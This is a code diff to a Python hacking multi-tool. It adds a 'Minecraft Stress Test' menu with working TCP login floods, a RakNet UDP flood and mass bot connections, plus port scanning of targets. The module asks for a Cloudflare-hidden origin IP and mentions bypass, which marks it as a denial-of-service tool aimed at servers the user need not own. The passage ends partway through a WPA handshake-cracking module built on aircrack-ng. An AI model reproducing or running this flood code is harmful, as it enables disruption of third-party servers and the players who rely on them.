@@ -18,6 +18,7 @@ import socket
 import sqlite3
 import ssl
 import string
+import struct
 import subprocess
 import sys
 import threading
@@ -224,7 +225,7 @@ KEY_MAP = {m["key"]: m for m in MODULES}
 
 def _menu_loop(menu_id, title, items, color=CYAN):
     """Generic animated menu loop. items: list of (key, label, handler)."""
-    handlers = {k: h for k, h, *_ in items}
+    handlers = {k: h for k, _, h in items}
     while True:
         header_box(title, color)
         for key, label, *_ in items:
@@ -286,6 +287,27 @@ def _run(cmd, timeout=10, text=True):
 
 def _which(tool):
     return shutil.which(tool)
+
+
+def _run_as_admin(cmd_list, reason=""):
+    """Run a command with sudo on POSIX when not root. Returns bool success."""
+    desc = " ".join(cmd_list)
+    print(f"  {CYAN}{reason or desc}{RESET}")
+    if not _is_root() and os.name == "posix" and _which("sudo"):
+        cmd_list = ["sudo"] + cmd_list
+    try:
+        r = subprocess.run(cmd_list, capture_output=True, text=True, timeout=300, errors="replace")
+        if r.returncode == 0:
+            print(f"  {GREEN}{SYM_CHECK}  Success{RESET}")
+        else:
+            print(f"  {RED}{SYM_X}  Failed (exit {r.returncode}){RESET}")
+            if r.stderr.strip():
+                for line in r.stderr.strip().splitlines()[-3:]:
+                    print(f"    {RED}{line}{RESET}")
+        return r.returncode == 0
+    except Exception as e:
+        print(f"  {RED}{SYM_X}  Error: {e}{RESET}")
+        return False
 
 
 def _check_root(require_scapy=False):
@@ -1217,10 +1239,667 @@ def stress_http():
     print(f"\n  {c(f'Done: {ok}/{sent} OK in {elapsed:.1f}s ({rate:.1f} req/s)', GREEN)}\n")
 
 
+# ── Minecraft (Java/Bedrock) helpers ──────────────────────────
+
+def _dns_parse_qname(buf, offset):
+    """Parse a (possibly compressed) DNS name. Returns (name, next_offset)."""
+    labels = []
+    ret = offset
+    cursor = offset
+    jumps = 0
+    while cursor < len(buf):
+        length = buf[cursor]
+        if length == 0:
+            if not jumps:
+                ret = cursor + 1
+            break
+        if length & 0xC0 == 0xC0:
+            if cursor + 1 >= len(buf):
+                break
+            ptr = ((length & 0x3F) << 8) | buf[cursor + 1]
+            if not jumps:
+                ret = cursor + 2
+            cursor = ptr
+            jumps += 1
+            if jumps > 20:
+                break
+            continue
+        cursor += 1
+        end = cursor + length
+        if end > len(buf):
+            break
+        labels.append(buf[cursor:end].decode("ascii", "replace"))
+        cursor = end
+    return ".".join(labels), ret
+
+
+def _dns_query(domain, qtype):
+    """Raw DNS query (no dnspython needed). Returns rdata bytes for qtype."""
+    if not domain:
+        return []
+    qtypes = {"A": 1, "NS": 2, "MX": 15, "TXT": 16, "AAAA": 28, "SRV": 33}
+    qt = qtypes.get(qtype, qtype) if isinstance(qtype, str) else qtype
+    trans_id = random.randint(0, 65535)
+    header = struct.pack(">HHHHHH", trans_id, 0x0100, 1, 0, 0, 0)
+    qname = b"".join(bytes([len(x)]) + x.encode("ascii", "replace") for x in domain.split(".")) + b"\x00"
+    packet = header + qname + struct.pack(">HH", qt, 1)
+
+    resolvers = []
+    try:
+        with open("/etc/resolv.conf") as fh:
+            for line in fh:
+                parts = line.strip().split()
+                if parts and parts[0] == "nameserver" and len(parts) >= 2 and ":" not in parts[1]:
+                    resolvers.append(parts[1])
+    except OSError:
+        pass
+    resolvers += ["8.8.8.8", "1.1.1.1"]
+
+    for rsv in resolvers:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.settimeout(3)
+            s.sendto(packet, (rsv, 53))
+            data, _ = s.recvfrom(4096)
+            s.close()
+            if len(data) < 12:
+                continue
+            rid, _flags = struct.unpack(">HH", data[:4])
+            if rid != trans_id:
+                continue
+            ancount = struct.unpack(">H", data[6:8])[0]
+            if ancount == 0:
+                return []
+            off = 12
+            while off < len(data):
+                length = data[off]
+                if length == 0:
+                    off += 1
+                    break
+                if length & 0xC0 == 0xC0:
+                    off += 2
+                    break
+                off += 1 + length
+            off += 4
+            answers = []
+            for _ in range(ancount):
+                _name, off = _dns_parse_qname(data, off)
+                if off + 10 > len(data):
+                    break
+                rtype, _rclass, _ttl, rdlen = struct.unpack(">HHIH", data[off:off + 10])
+                off += 10
+                rdata = data[off:off + rdlen]
+                off += rdlen
+                if rtype == qt:
+                    answers.append(rdata)
+            return answers
+        except Exception:
+            continue
+    return []
+
+
+def _mc_varint(v):
+    out = bytearray()
+    while True:
+        if v & 0xFFFFFF80 == 0:
+            out.append(v & 0x7F)
+            break
+        out.append((v & 0x7F) | 0x80)
+        v >>= 7
+    return bytes(out)
+
+
+def _mc_pstr(s):
+    d = s.encode("utf-8")
+    return _mc_varint(len(d)) + d
+
+
+def _mc_packet(pid, *parts):
+    body = bytes([pid]) + b"".join(parts)
+    return _mc_varint(len(body)) + body
+
+
+def _mc_read_varint(sock):
+    v = 0
+    for i in range(5):
+        b = sock.recv(1)
+        if not b:
+            return None
+        v |= (b[0] & 0x7F) << (7 * i)
+        if not (b[0] & 0x80):
+            break
+    return v
+
+
+def _mc_build_handshake(ip, port):
+    return _mc_packet(0x00, _mc_varint(764), _mc_pstr(ip), port.to_bytes(2, "big"), _mc_varint(2))
+
+
+def _mc_build_login(name=None):
+    if name is None:
+        name = f"Bot_{random.randint(10000, 99999)}_{random.choice(['X', 'Pro', 'YT', 'OP', 'HD'])}"
+    return _mc_packet(0x00, _mc_pstr(name))
+
+
+def _mc_bot_worker(host, port, results, idx):
+    s = None
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(5)
+        s.connect((host, port))
+        s.sendall(_mc_build_handshake(host, port))
+        s.sendall(_mc_build_login())
+        end = time.time() + 6
+        while time.time() < end:
+            try:
+                s.settimeout(0.5)
+                plen = _mc_read_varint(s)
+                if plen is None:
+                    break
+                pid = _mc_read_varint(s)
+                if pid is None:
+                    break
+                rest = plen - len(_mc_varint(pid))
+                data = b""
+                while len(data) < rest:
+                    chunk = s.recv(rest - len(data))
+                    if not chunk:
+                        break
+                    data += chunk
+                if pid == 0x21:
+                    s.sendall(_mc_packet(0x0F, data))
+            except socket.timeout:
+                continue
+            except Exception:
+                break
+        results[idx] = 1
+    except Exception:
+        results[idx] = 0
+    finally:
+        if s:
+            try:
+                s.close()
+            except Exception:
+                pass
+
+
+def mc_tcp_flood_worker(ip, port, duration, results, idx, mode="rapid"):
+    sent = 0
+    errs = 0
+    end = time.time() + duration
+    hs = _mc_build_handshake(ip, port)
+    try:
+        while time.time() < end:
+            s = None
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+                s.settimeout(3)
+                s.connect((ip, port))
+                s.sendall(hs)
+                s.sendall(_mc_build_login())
+                sent += 1
+                results[idx] = (sent, errs)
+            except Exception:
+                errs += 1
+                results[idx] = (sent, errs)
+                if s:
+                    try:
+                        s.close()
+                    except Exception:
+                        pass
+                continue
+            if mode == "rapid":
+                try:
+                    s.close()
+                except Exception:
+                    pass
+            else:
+                end2 = min(time.time() + 2, end)
+                while time.time() < end2:
+                    try:
+                        s.settimeout(0.5)
+                        plen = _mc_read_varint(s)
+                        if plen is None:
+                            break
+                        pid = _mc_read_varint(s)
+                        if pid is None:
+                            break
+                        rest = plen - len(_mc_varint(pid))
+                        data = b""
+                        while len(data) < rest:
+                            chunk = s.recv(rest - len(data))
+                            if not chunk:
+                                break
+                            data += chunk
+                        if pid == 0x21:
+                            s.sendall(_mc_packet(0x0F, data))
+                            sent += 1
+                            results[idx] = (sent, errs)
+                    except socket.timeout:
+                        continue
+                    except Exception:
+                        break
+                try:
+                    s.close()
+                except Exception:
+                    pass
+        results[idx] = (sent, errs)
+    except Exception:
+        results[idx] = (sent, errs)
+
+
+def mc_udp_flood_worker(ip, port, duration, results, idx, mode="rapid"):
+    sent = 0
+    errs = 0
+    end = time.time() + duration
+    RAKNET_MAGIC = b"\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78"
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        while time.time() < end:
+            try:
+                timestamp = struct.pack(">Q", int(time.time() * 1000))
+                payload = b"\x01" + timestamp + RAKNET_MAGIC + os.urandom(8)
+                s.sendto(payload, (ip, port))
+                sent += 1
+                if sent % 100 == 0:
+                    results[idx] = (sent, errs)
+            except Exception:
+                errs += 1
+                results[idx] = (sent, errs)
+        results[idx] = (sent, errs)
+    except Exception:
+        results[idx] = (sent, errs)
+
+
+def _probe_online(ip, port, timeout=3):
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(timeout)
+        s.connect((ip, port))
+        s.close()
+        return True
+    except Exception:
+        return False
+
+
+def mc_srv_lookup(domain):
+    """Java Edition SRV lookup: _minecraft._tcp.<domain> -> (host, port)."""
+    srv_name = f"_minecraft._tcp.{domain}"
+    if _which("dig"):
+        try:
+            r = _run(["dig", "+short", "SRV", srv_name], timeout=5)
+            if r and r.stdout:
+                for line in r.stdout.strip().splitlines():
+                    parts = line.split()
+                    if len(parts) >= 4:
+                        try:
+                            port = int(parts[2])
+                        except ValueError:
+                            continue
+                        host = ".".join(parts[3:]).rstrip(".")
+                        if host and host != ".":
+                            return host, port
+        except Exception:
+            pass
+    for rdata in _dns_query(srv_name, "SRV"):
+        if len(rdata) < 7:
+            continue
+        _pri, _weight, port = struct.unpack(">HHH", rdata[:6])
+        host, _ = _dns_parse_qname(rdata, 6)
+        if host and host != ".":
+            return host, port
+    return None, None
+
+
+def resolve_ip_candidates(domain):
+    """Resolve a domain to all IPv4 addresses (dig preferred, getaddrinfo fallback)."""
+    if _is_ip(domain):
+        return [domain]
+    ips = []
+    if _which("dig"):
+        try:
+            r = _run(["dig", "+short", "A", domain], timeout=5)
+            if r and r.stdout:
+                for line in r.stdout.strip().splitlines():
+                    ip = line.strip().rstrip(".")
+                    try:
+                        socket.inet_aton(ip)
+                        if ip not in ips:
+                            ips.append(ip)
+                    except OSError:
+                        pass
+        except Exception:
+            pass
+    if not ips:
+        try:
+            for info in socket.getaddrinfo(domain, 0, socket.AF_INET):
+                ip = info[4][0]
+                if ip not in ips:
+                    ips.append(ip)
+        except Exception:
+            pass
+    return ips
+
+
+def resolve_mc_target(target):
+    """Find the real Minecraft server address from a domain (SRV-aware).
+    Returns (ip, port, host_label) or (None, port, host_label) on failure."""
+    host = target
+    port = 25565
+    if not _is_ip(target):
+        srv_host, srv_port = mc_srv_lookup(target)
+        if srv_host:
+            host = srv_host
+            port = srv_port
+            print(f"  {c(SYM_CHECK + ' SRV record:', GREEN)} _minecraft._tcp.{target} {SYM_ARROW} {host}:{port}")
+        else:
+            print(f"  {c('No SRV record - using domain directly.', CYAN)}")
+    ips = resolve_ip_candidates(host)
+    if not ips:
+        print(f"  {c(SYM_X + ' Could not resolve', RED)} {host}")
+        return None, port, host
+    for ip in ips:
+        print(f"  {c('Resolved:', GREEN)} {host} {SYM_ARROW} {ip}")
+    if _is_cloudflare(ips[0]):
+        print(f"  {YELLOW}Cloudflare detected on resolved IP {ips[0]}.{RESET}")
+    return ips[0], port, host
+
+
+MC_PORT_RANGES = [
+    25565, 25566, 25575, 25576, 25577, 25578,
+    19132, 19133, 25564, 25567, 25568, 25569, 25570,
+    25571, 25572, 25573, 25574, 25579, 25580,
+    25585, 25590, 25595, 25600, 25650, 25700, 25750,
+    25800, 25850, 25900, 25950, 26000, 26050, 26100,
+    26150, 26200, 26250, 26300, 26350, 26400, 26450,
+    26500, 26550, 26600, 26650, 26700, 26750, 26800,
+    26850, 26900, 26950, 27000, 27015, 27050, 27100,
+    20000, 20001, 20002, 20003, 20004, 20005,
+    10000, 10001, 10002, 10003, 10004, 10005,
+    30000, 30001, 30002, 30003, 30004, 30005,
+]
+
+
+def mc_find_ports(ip, verbose=True):
+    open_ports = []
+
+    if verbose:
+        print(f"  {c('Probing common MC ports directly (for containerized/Pterodactyl servers)...', CYAN)}")
+
+    def _probe(port, results, idx):
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(1.5)
+            r = s.connect_ex((ip, port))
+            s.close()
+            results[idx] = port if r == 0 else None
+        except Exception:
+            results[idx] = None
+
+    batch_size = 100
+    for batch_start in range(0, len(MC_PORT_RANGES), batch_size):
+        batch = MC_PORT_RANGES[batch_start:batch_start + batch_size]
+        br = {}
+        with ThreadPoolExecutor(max_workers=100) as ex:
+            fs = {ex.submit(_probe, p, br, i): i for i, p in enumerate(batch)}
+            for f in as_completed(fs):
+                try:
+                    f.result()
+                except Exception:
+                    pass
+        for i, p in enumerate(batch):
+            if br.get(i) is not None:
+                open_ports.append(p)
+
+    open_ports.sort()
+    if verbose and open_ports:
+        if len(open_ports) <= 30:
+            print(f"  {c('Open ports:', GREEN)} {c(str(open_ports), CYAN)}")
+        else:
+            print(f"  {c(f'Open ports ({len(open_ports)}):', GREEN)} {c(str(open_ports[:20]), CYAN)}{DIM}...{RESET}")
+    elif verbose:
+        print(f"  {c('No MC ports detected. Try entering the port manually.', YELLOW)}")
+    return open_ports
+
+
+def _ensure_mineflayer():
+    tool_dir = os.path.dirname(os.path.abspath(__file__))
+    nm_dir = os.path.join(tool_dir, "node_modules", "mineflayer")
+    for candidate in (nm_dir,
+                      os.path.join(os.path.dirname(tool_dir), "v2", "node_modules", "mineflayer"),
+                      os.path.join(os.path.dirname(tool_dir), "v2.1", "node_modules", "mineflayer"),
+                      os.path.join(os.path.dirname(tool_dir), "v2.2", "node_modules", "mineflayer")):
+        if os.path.isdir(candidate):
+            return
+    print(f"  {YELLOW}{SYM_WARN}  Mineflayer not found. Install with: cd v4 && npm install mineflayer{RESET}")
+    try:
+        subprocess.run(["npm", "install", "mineflayer"], cwd=tool_dir, capture_output=True, timeout=120)
+        print(f"  {GREEN}{SYM_CHECK}  Mineflayer installed.{RESET}")
+    except Exception:
+        pass
+
+
+def stress_minecraft():
+    header_box("Minecraft Stress Test", RED)
+    target = _get("Server IP or domain")
+    if not target:
+        return
+    ip, srv_port, real_host = resolve_mc_target(target)
+    if not ip:
+        return
+
+    if _is_cloudflare(ip):
+        ans = input(f"  {YELLOW}Cloudflare detected! Enter real origin IP if known (or Enter to continue): {SYM_PROMPT} {RESET}").strip()
+        if ans:
+            ip = ans
+            print(f"  {c(f'Using manual IP: {ip}', GREEN)}")
+        else:
+            print(f"  {c('Continuing with resolved IP (bypass may be needed).', YELLOW)}")
+
+    print(f"  {c('Scanning for Minecraft ports...', CYAN)}")
+    ports = mc_find_ports(ip)
+    if ports:
+        print(f"  {c('Found MC ports:', GREEN)} {c(str(ports), CYAN)}")
+    else:
+        print(f"  {c('No MC ports auto-detected (nmap may not see containerized servers).', YELLOW)}")
+
+    p_in = input(f"  {c(f'Port (default {srv_port}) {SYM_PROMPT} ', CYAN)}").strip()
+    port = int(p_in) if p_in.isdigit() else srv_port
+
+    print(f"\n  {c('Attack type:', CYAN)}")
+    print(f"  {c('[1]', GREEN)}  Bot attack (Node.js mineflayer bots)")
+    print(f"  {c('[2]', GREEN)}  TCP flood")
+    print(f"  {c('[3]', GREEN)}  UDP flood (Bedrock)")
+    print(f"  {c('[4]', GREEN)}  Both (bots + flood)")
+    at = input(f"  {c(f'Choice {SYM_PROMPT} ', CYAN)}").strip()
+    if at not in ("1", "2", "3", "4"):
+        print(f"  {RED}Invalid choice.{RESET}")
+        return
+
+    bot_enabled = at in ("1", "4")
+    flood_enabled = at in ("2", "3", "4")
+
+    bc = 0
+    bd = 0
+    ft = "r"
+    dur = 30
+    cc = 500
+
+    if bot_enabled:
+        _ensure_mineflayer()
+        b_in = input(f"  {c(f'Bot count (default 20) {SYM_PROMPT} ', CYAN)}").strip()
+        bc = int(b_in) if b_in.isdigit() else 20
+        bd_in = input(f"  {c(f'Bot duration seconds (default 30) {SYM_PROMPT} ', CYAN)}").strip()
+        bd = int(bd_in) if bd_in.isdigit() else 30
+
+    if flood_enabled:
+        print(f"\n  {c('Flood type:', CYAN)}")
+        if at == "2":
+            print(f"  {c('[r/1]', GREEN)}  Rapid fire (max CPS)")
+            print(f"  {c('[s/2]', GREEN)}  Sustained (hold + keepalives)")
+            ft_raw = input(f"  {c(f'Choice (default r) {SYM_PROMPT} ', CYAN)}").strip().lower() or "r"
+            ft = {"r": "r", "1": "r", "s": "s", "2": "s"}.get(ft_raw, "r")
+        elif at == "3":
+            ft = "u"
+            print(f"  {c('UDP flood (Bedrock protocol)', GREEN)}")
+        else:
+            print(f"  {c('[r/1]', GREEN)}  Rapid fire TCP (max CPS)")
+            print(f"  {c('[s/2]', GREEN)}  Sustained TCP (hold + keepalive)")
+            print(f"  {c('[u/3]', GREEN)}  UDP flood (Bedrock)")
+            print(f"  {c('[b/4]', GREEN)}  Both TCP rapid + UDP")
+            ft_raw = input(f"  {c(f'Choice (default r) {SYM_PROMPT} ', CYAN)}").strip().lower() or "r"
+            ft = {"r": "r", "1": "r", "s": "s", "2": "s", "u": "u", "3": "u", "b": "b", "4": "b"}.get(ft_raw, "r")
+
+        d_in = input(f"  {c(f'Duration seconds (default 30) {SYM_PROMPT} ', CYAN)}").strip()
+        dur = int(d_in) if d_in.isdigit() else 30
+        c_in = input(f"  {c(f'Concurrent connections (default 500) {SYM_PROMPT} ', CYAN)}").strip()
+        cc = int(c_in) if c_in.isdigit() else 500
+
+    if flood_enabled:
+        print(f"\n  {c('Checking if host is online...', CYAN)}", end=" ")
+        sys.stdout.flush()
+        if _probe_online(ip, port):
+            print(f"{GREEN}{SYM_CHECK} online{RESET}")
+        else:
+            print(f"{RED}{SYM_X} unreachable{RESET}")
+            ans = input(f"  {YELLOW}Host not reachable on port {port}. Continue anyway? (y/N) {SYM_PROMPT} {RESET}").strip().lower()
+            if ans != "y":
+                print(f"  {c('Aborted.', RED)}")
+                return
+
+    bot_proc = None
+    if bot_enabled:
+        bot_script = os.path.join(os.path.dirname(os.path.abspath(__file__)), "mc_bots.js")
+        if os.path.exists(bot_script):
+            print(f"  {c('Starting mineflayer bots...', CYAN)}")
+            try:
+                bot_proc = subprocess.Popen(["node", bot_script, ip, str(port), str(bc), str(bd)],
+                                            stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
+                def _bot_reader():
+                    for line in iter(bot_proc.stdout.readline, ''):
+                        if line:
+                            sys.stdout.write(f"\r  {c('[Bot]', MAGENTA)} {line.strip()}{' ' * 40}\n")
+                            sys.stdout.flush()
+                t = threading.Thread(target=_bot_reader, daemon=True)
+                t.start()
+            except FileNotFoundError:
+                print(f"  {RED}{SYM_X} Node.js not found. Install Node.js 18+ to use mineflayer bots.{RESET}")
+                print(f"  {YELLOW}Falling back to raw TCP bots...{RESET}")
+                bot_enabled = False
+            except Exception as e:
+                print(f"  {RED}{SYM_X} Failed to launch bots: {e}{RESET}")
+                bot_enabled = False
+        else:
+            print(f"  {YELLOW}mc_bots.js not found. Running raw TCP bots in background...{RESET}")
+            def _run_bots():
+                br = {}
+                with ThreadPoolExecutor(max_workers=bc) as ex:
+                    fs = {ex.submit(_mc_bot_worker, ip, port, br, i): i for i in range(bc)}
+                    for f in as_completed(fs):
+                        try:
+                            f.result()
+                        except Exception:
+                            pass
+            t = threading.Thread(target=_run_bots, daemon=True)
+            t.start()
+
+    if flood_enabled:
+        udp_port = 19132
+
+        def _run_flood(worker_func, workers, label, use_port, mode="rapid"):
+            _start = time.time()
+            _sent = [0]
+            _errs = [0]
+            br = {}
+            actual_workers = min(workers, 5000)
+            if workers > 5000:
+                print(f"  {YELLOW}Capping concurrent connections to 5000 (OS limit). Your input: {workers}{RESET}")
+
+            def _show_progress(elapsed, total_s, total_e):
+                rate = total_s / elapsed if elapsed > 0 else 0
+                bar_len = 30
+                pct = min(elapsed / dur, 1.0) if dur > 0 else 1
+                filled = int(bar_len * pct)
+                bar = f"{GREEN}{'█' * filled}{DIM}{'░' * (bar_len - filled)}{RESET}"
+                sys.stdout.write(f"\r  {CYAN}{label}{RESET} [{bar}] "
+                                 f"{GREEN}S:{total_s:,}{RESET} "
+                                 f"{RED}E:{total_e:,}{RESET} "
+                                 f"{MAGENTA}{rate:,.0f}/s{RESET} "
+                                 f"{YELLOW}{elapsed:.0f}s/{dur}s{RESET}  "
+                                 f"{DIM}Ctrl+C stop{RESET}{' ' * 20}")
+                sys.stdout.flush()
+
+            _last_progress = 0
+            ex = ThreadPoolExecutor(max_workers=actual_workers)
+            fs = {ex.submit(worker_func, ip, use_port, dur, br, i, mode): i for i in range(actual_workers)}
+            try:
+                for f in as_completed(fs):
+                    try:
+                        r = f.result()
+                        if isinstance(r, tuple) and len(r) == 2:
+                            _sent[0] += r[0]
+                            _errs[0] += r[1]
+                    except Exception:
+                        pass
+                    elapsed = time.time() - _start
+                    if elapsed - _last_progress >= 0.3:
+                        total_s = sum(v[0] for v in br.values() if isinstance(v, tuple) and len(v) == 2)
+                        total_e = sum(v[1] for v in br.values() if isinstance(v, tuple) and len(v) == 2)
+                        _show_progress(elapsed, total_s, total_e)
+                        _last_progress = elapsed
+            except KeyboardInterrupt:
+                ex.shutdown(wait=False, cancel_futures=True)
+                print()
+                raise
+            finally:
+                ex.shutdown(wait=False, cancel_futures=True)
+
+            el = time.time() - _start
+            total_s = sum(v[0] for v in br.values() if isinstance(v, tuple) and len(v) == 2)
+            total_e = sum(v[1] for v in br.values() if isinstance(v, tuple) and len(v) == 2)
+            _show_progress(el, total_s, total_e)
+            rat = total_s / el if el > 0 else 0
+            print(f"\n  {GREEN}{SYM_CHECK} {label}: {c(f'S:{total_s:,}', GREEN)} {c(f'E:{total_e:,}', RED)} in {c(f'{el:.1f}s', CYAN)} ({c(f'{rat:,.0f}/s', MAGENTA)}){RESET}")
+            return total_s
+
+        total = 0
+        try:
+            if ft in ("r", "s"):
+                mode = "rapid" if ft == "r" else "sustained"
+                total += _run_flood(mc_tcp_flood_worker, cc, "TCP flood", port, mode)
+            elif ft == "u":
+                total += _run_flood(mc_udp_flood_worker, cc, "UDP flood", udp_port)
+            elif ft == "b":
+                total += _run_flood(mc_tcp_flood_worker, cc, "TCP flood", port, "rapid")
+                total += _run_flood(mc_udp_flood_worker, cc, "UDP flood", udp_port)
+            print(f"  {c(SYM_CHECK + f' Total: {total:,} packets sent', GREEN)}")
+        except KeyboardInterrupt:
+            print(f"\n  {YELLOW}Flood stopped by user.{RESET}")
+    else:
+        print(f"  {c('Bot attack running in background. Press Ctrl+C to stop.', YELLOW)}")
+        try:
+            while True:
+                if bot_proc and bot_proc.poll() is not None:
+                    print(f"\n  {c('Bots finished.', GREEN)}")
+                    break
+                time.sleep(1)
+        except KeyboardInterrupt:
+            print(f"\n  {YELLOW}Stopped.{RESET}")
+            if bot_proc:
+                try:
+                    bot_proc.terminate()
+                except Exception:
+                    pass
+
+    print()
+
+
 def menu_stress():
     _menu_loop("stress", "Stress Testing", [
-        ("1", "IP Flood Test", stress_ip),
+        ("1", "Minecraft Stress Test", stress_minecraft),
         ("2", "Web Stress Test", stress_http),
+        ("3", "IP Flood Test", stress_ip),
         ("b", "Back to main menu", None),
     ], RED)
 
@@ -2198,10 +2877,418 @@ def wifi_audit():
     print()
 
 
+def _nmcli_split(line):
+    parts, cur, esc = [], "", False
+    for ch in line:
+        if esc:
+            cur += ch
+            esc = False
+        elif ch == "\\":
+            esc = True
+        elif ch == ":":
+            parts.append(cur)
+            cur = ""
+        else:
+            cur += ch
+    parts.append(cur)
+    return parts
+
+
+def _find_wifi_iface():
+    try:
+        r = subprocess.run(["nmcli", "-t", "dev", "status"], capture_output=True, text=True, timeout=10)
+        if r.returncode == 0 and r.stdout.strip():
+            for line in r.stdout.splitlines():
+                parts = _nmcli_split(line)
+                if len(parts) >= 3 and parts[2] == "wifi":
+                    if len(parts) >= 2 and parts[1] == "connected":
+                        return parts[0]
+            for line in r.stdout.splitlines():
+                parts = _nmcli_split(line)
+                if len(parts) >= 3 and parts[2] == "wifi":
+                    return parts[0]
+    except Exception:
+        pass
+    try:
+        r = subprocess.run(["iw", "dev"], capture_output=True, text=True, timeout=10)
+        names = re.findall(r'Interface\s+(\S+)', r.stdout)
+        if names:
+            return names[0]
+    except Exception:
+        pass
+    try:
+        for n in os.listdir("/sys/class/net"):
+            if os.path.exists(f"/sys/class/net/{n}/wireless"):
+                return n
+    except Exception:
+        pass
+    return None
+
+
+def _all_wifi_ifaces():
+    ifaces = []
+    try:
+        r = subprocess.run(["iw", "dev"], capture_output=True, text=True, timeout=10)
+        names = re.findall(r'Interface\s+(\S+)', r.stdout)
+        for n in names:
+            if "p2p" not in n.lower() and "mon" not in n.lower():
+                ifaces.append(n)
+    except Exception:
+        pass
+    if not ifaces:
+        try:
+            for n in os.listdir("/sys/class/net"):
+                if os.path.exists(f"/sys/class/net/{n}/wireless"):
+                    ifaces.append(n)
+        except Exception:
+            pass
+    return ifaces
+
+
+def _wifi_connected_ssid():
+    try:
+        r = subprocess.run(["iwgetid"], capture_output=True, text=True, timeout=10)
+        m = re.search(r'ESSID:"(.*?)"', r.stdout)
+        return m.group(1) if m else None
+    except Exception:
+        return None
+
+
+def _wifi_connected_bssid():
+    try:
+        r = subprocess.run(["iwgetid", "-r", "--ap"], capture_output=True, text=True, timeout=10)
+        if r.stdout.strip():
+            return r.stdout.strip().lower()
+    except Exception:
+        pass
+    try:
+        r = subprocess.run(["iwgetid", "--raw", "--ap"], capture_output=True, text=True, timeout=10)
+        if r.stdout.strip():
+            return r.stdout.strip().lower()
+    except Exception:
+        pass
+    try:
+        r = subprocess.run(["iw", "dev", "link"], capture_output=True, text=True, timeout=10)
+        m = re.search(r'Connected to ([0-9a-f:]+)', r.stdout)
+        if m:
+            return m.group(1).lower()
+    except Exception:
+        pass
+    return None
+
+
+def _wifi_band(chan):
+    try:
+        c = int(chan)
+        return "2.4G" if c <= 14 else "5G"
+    except (TypeError, ValueError):
+        return "?"
+
+
+def _wifi_scan_networks():
+    nets = []
+    try:
+        r = subprocess.run(["nmcli", "-t", "-f", "SSID,BSSID,SIGNAL,CHAN,SECURITY", "dev", "wifi", "list"],
+                           capture_output=True, text=True, timeout=20)
+        if r.returncode == 0 and r.stdout.strip():
+            for line in r.stdout.splitlines():
+                parts = _nmcli_split(line)
+                if len(parts) >= 5 and parts[1] and parts[1] != "--":
+                    nets.append({"ssid": parts[0] or "(hidden)", "bssid": parts[1],
+                                 "signal": parts[2], "chan": parts[3], "enc": parts[4],
+                                 "band": _wifi_band(parts[3])})
+            if nets:
+                return nets
+    except Exception:
+        pass
+    try:
+        r = subprocess.run(["iwlist", "scan"], capture_output=True, text=True, timeout=30)
+        if r.returncode == 0 and r.stdout.strip():
+            cells = re.split(r'\n\s*Cell\s', "\n" + r.stdout)
+            for cell in cells[1:]:
+                m = re.search(r'Address: ([0-9A-Fa-f:]+)', cell)
+                e = re.search(r'ESSID:"(.*?)"', cell)
+                ch = re.search(r'Channel[: ]+(\d+)', cell)
+                s = re.search(r'Signal level=(-?\d+)', cell)
+                enc = "Open" if 'Encryption key:off' in cell else "WPA"
+                chan = ch.group(1) if ch else "?"
+                ssid = e.group(1) if e else ""
+                nets.append({"ssid": ssid if ssid else "(hidden)",
+                             "bssid": m.group(1) if m else "?",
+                             "chan": chan,
+                             "signal": s.group(1) if s else "?",
+                             "enc": enc,
+                             "band": _wifi_band(chan)})
+    except Exception:
+        pass
+    if not nets:
+        try:
+            iface = _find_wifi_iface()
+            if iface:
+                r = subprocess.run(["iw", "dev", iface, "scan"], capture_output=True, text=True, timeout=30)
+                if r.returncode == 0 and r.stdout.strip():
+                    for block in re.split(r'\nBSS ', r.stdout):
+                        if not block.strip():
+                            continue
+                        m = re.search(r'^([0-9a-f:]{17})', block)
+                        e = re.search(r'SSID:(\S+)', block)
+                        ch = re.search(r'primary channel: (\d+)', block)
+                        s = re.search(r'signal: (-?\d+\.\d+)', block)
+                        enc = "Open" if 'WPA' not in block and 'RSN' not in block else "WPA"
+                        chan = ch.group(1) if ch else "?"
+                        ssid = e.group(1) if e else ""
+                        nets.append({"ssid": ssid if ssid else "(hidden)",
+                                     "bssid": m.group(1) if m else "?",
+                                     "chan": chan,
+                                     "signal": s.group(1).split('.')[0] if s else "?",
+                                     "enc": enc,
+                                     "band": _wifi_band(chan)})
+        except Exception:
+            pass
+    return nets
+
+
+def wifi_password_audit():
+    header_box("WiFi Password Audit (WPA Handshake)", MAGENTA)
+    if platform.system().lower() != "linux":
+        print(f"  {RED}This module needs Linux tools (airmon-ng / airodump-ng / aircrack-ng).{RESET}")
+        print(f"  {YELLOW}Use a Kali/Parrot live USB or VM on other platforms.{RESET}")
+        return
+    wifi_legal_warning()
+    if not _yes("I own (or have written permission for) this network"):
+        print(f"  {YELLOW}Cancelled. Stay legal and ethical.{RESET}\n")
+        return
+    if not _is_root():
+        print(f"  {RED}Root privileges are required for monitor mode and packet capture.{RESET}")
+        print(f"  {YELLOW}Re-run as root: sudo python3 tool.py  (or: sudo darkie-tools){RESET}\n")
+        return
+    missing = [t for t in ("airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng") if not _which(t)]
+    if missing:
+        print(f"  {YELLOW}Missing tools: {', '.join(missing)}{RESET}")
+        if _yes("Install the aircrack-ng suite now", default=True):
+            _run_as_admin(["apt-get", "install", "-y", "-qq", "aircrack-ng"], "Installing aircrack-ng suite")
+            missing = [t for t in ("airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng") if not _which(t)]
+        if missing:
+            print(f"  {RED}aircrack-ng suite still missing. Install it manually (e.g. apt install aircrack-ng).{RESET}\n")
+            return
+    print(f"  {c('Scanning for nearby WiFi networks...', MAGENTA)}")
+    print(f"  {c(SYM_LINE_H * 50, CYAN)}")
+    nets = _wifi_scan_networks()
+    if not nets:
